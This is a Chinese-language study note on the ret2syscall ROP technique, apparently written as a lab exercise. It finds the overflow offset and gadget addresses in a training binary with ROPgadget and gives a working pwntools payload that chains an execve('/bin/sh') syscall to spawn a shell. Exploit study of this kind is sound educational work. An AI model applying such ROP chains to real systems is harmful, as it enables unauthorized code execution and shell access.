# Rop-Ret2Syscall技术学习

### Ret2Syscall

前面所学的Ret2Text 和 Ret2Shellcode都有一定的局限性；要根据情况加以运用

​		首先是Ret2Text 运用的前提是 函数中由我们需要 函数代码；例如 以获取用户权限为例，使用Ret2Text 的方式需要我们在程序中具有System函数，如果没有该函数，就很难进行下一步；因此进一步提出了Ret2Shellcod，对于没有System函数的程序，我们在程序分配的变量空间中找到一个合适的长度，然后将我们构造的shellcode(用于实现System函数)的代码写入，然后通过ret，使指令运行到该处，把数据当作指令解析来运行；在这个过程中，有一个必要条件，即数据存放的位置具有可执行权限 --->也就是未开启NX保护

​		面对开启NX保护，又缺少目标代码的程序，进一步提出了解决方案Ret2Syscall， 需要ROPgadget小工具，Gaget是指在程序中的指令片段，为了达到目的，需要多个Gaget。Gaget一般最后都有一个ret，因为要将程序控制权(ip)给下一个Gadget

**Attention:**该方法同样有一定的局限性，需要存在我们构造函数的所有gadgets，缺一不可！！！

### ROPgaget工具

用于在代码段中查找自己所需要的代码片段





### 程序示例

#### 查看程序的保护措施

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-05_20-26-00.png)

由上图可知，该程序开启了NX保护，即我们无法使用Ret2Text 和Ret2Shellcode

#### GDB查看程序

使用命令查看main函数大概流程如下图，较为简单

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-05_20-19-41.png)

可知，程序首先是，输出两个字符串，然后要求进行输入



#### 查看溢出点

使用 cyclic 200，生成字符串，然后输入，计算偏移位置

得到 偏移量 为 112 ，可知输入地址到返回地址的偏移量为112



#### 明确目标

​		由前面的工作，我们已经知道了，目前要使用Ret2Syscall的方法，因此我们需要查找gadgets片段，但我们首先需要搞清楚自己需要的gadget片段是什么；

​		首先，要明白，我们需要构建 实现System函数，而该函数的本质是内部系统调用；需要设置一定的参数，具体如下(以32位程序环境为例)

```
系统调用号，即 eax 应该为 0xb

第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。

第二个参数，即 ecx 应该为 0

第三个参数，即 edx 应该为 0
```

所以 对应的需要以下几条指令

```
pop eax；ret  
pop ebx;pop ecx;pop edx;ret
```





#### 查找对应地址

首先使用ROPgadget查找pop eax | ret的地址,指令如下

```
ROPgadget --binary ./ret2syscall --only "pop|ret" | grep "eax"  
#"pop|ret" 表示查找 ret连在pop指令后面的 gadget ，但符合条件的指令集较多，因此使用grep "eax"  ，缩小范围，找出我们想要的指令
```

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-05_20-59-24.png)



由上面可知第一个地址为 0x080bb196



其次，使用ROPgadget查找具有 pop ebx;pop ecx;pop edx;ret 的指令

```
ROPgadget --binary ./ret2syscall  --only "pop|ret" |grep "ebx"|grep "ecx" |grep "edx"
```

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-06_10-38-30.png)

由上图可知，目标地址为 0x0806eb90 

由于ebx中要送入 "/bin/sh" 字符串的位置，所以我们也需要找到该字符串地址

```
ROPgadget --binary ./ret2syscall  --string "/bin/sh"
```

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-06_10-52-09.png)

得到该字符串的存储地址为 0x080be408

最后，我们把所有参数构造完成后，我们需要执行 int 0x80 ，告诉系统调用那个函数，我们需要执行该指令，那么同样需要找到该地址

```
ROPgadget --binary ./ret2syscall  --only "int"
```

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-06_11-05-58.png)

所需要的地址为 0x08049421

#### 堆栈图

所以为了完成目的，需要构造对应的堆栈图，如下图所示

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-06_15-20-35.png)

#### Payload

```python
from pwn import *
context(arch = "i386",os = "linux")
io = process("ret2syscall")
offset = 112
pop_eax = p32(0x080bb196)
pop_edx_ecx_ebx = p32(0x0806eb90)
bin_sh = p32(0x080be408)
int_0x80 = p32(0x08049421)

payload = b'A'*offset +pop_eax + p32(0xb) + pop_edx_ecx_ebx + p32(0) + p32(0) + bin_sh + int_0x80
#pause()   #用于调试
io.sendline(payload)
io.interactive()

```



#### 调试验证

首先，我们需要在payload发送前加入一个暂停函数，以便于GDB附加进行调试，参见payload

需要两个终端界面，其中一个使用 Python 运行 exp ，然后可以得到 程序的pid，并暂停下来；在另一个终端界面 使用gdb 附加到该pid进行调试，具体情况如下图

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-06_15-43-43.png)

由上图 可以清晰看到，exp运行后得到pid 然后暂停，使用gdb附加后，即可进入调试，此时为kernel函数，使用finish指令，运行完该函数

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-06_15-50-12.png)

接着，多次` finish`进入main函数，然后单步运行 

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-06_15-52-56.png)

然后走出main函数，得到如下图所示，可以很清楚的看到我们所构造的执行流程和栈数据

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-06_15-54-08.png)

多次`n`指令，单步运行后，可得到如下结果，我们的目标已经实现了

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-03-06_15-57-39.png)